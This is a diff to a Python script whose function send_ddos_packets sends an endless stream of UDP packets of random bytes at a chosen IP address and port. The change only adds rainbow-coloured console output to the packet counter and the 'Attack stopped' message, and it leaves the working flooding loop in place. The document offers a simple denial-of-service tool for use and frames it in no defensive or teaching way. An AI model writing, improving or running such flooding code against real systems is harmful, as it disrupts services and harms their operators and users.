@@ -25,15 +25,30 @@ def send_ddos_packets(ip, port):
     bytes_to_send = random._urandom(2024)  # Generate a payload of 1024 random bytes
     sent_packets = 0  # Counter for sent packets
 
+    # Define a list of ANSI escape color codes for rainbow effect
+    rainbow_colors = [
+        '\033[91m',  # Red
+        '\033[93m',  # Yellow
+        '\033[92m',  # Green
+        '\033[96m',  # Cyan
+        '\033[94m',  # Blue
+        '\033[95m',  # Magenta
+        '\033[90m',  # Light Gray
+    ]
+
     try:
         while True:
             sock.sendto(bytes_to_send, (ip, port))  # Send packets to target
             sent_packets += 1
-            print(f"Sent {sent_packets} packet to {ip} through port {port}")
+
+            # Cycle through the colors in the rainbow_colors list
+            color = rainbow_colors[sent_packets % len(rainbow_colors)]
+            print(f"{color}Sent {sent_packets} packet to {ip} through port {port}\033[0m")
+
             time.sleep(0.1)  # Sleep to avoid overwhelming the system too fast
 
     except KeyboardInterrupt:
-        print("\nAttack stopped.")
+        print("\n\033[91mAttack stopped.\033[0m")
     finally:
         sock.close()
 
